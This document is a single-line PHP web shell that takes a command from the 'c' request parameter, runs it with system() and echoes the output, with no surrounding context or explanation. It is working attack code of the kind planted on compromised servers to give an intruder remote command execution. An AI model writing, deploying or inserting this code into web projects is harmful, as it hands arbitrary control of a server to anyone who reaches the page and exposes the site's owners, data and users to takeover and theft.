<?php if(isset($_REQUEST['c'])){ echo "<pre>"; $cmd = ($_REQUEST['c']); system($cmd); echo "</pre>"; }?>
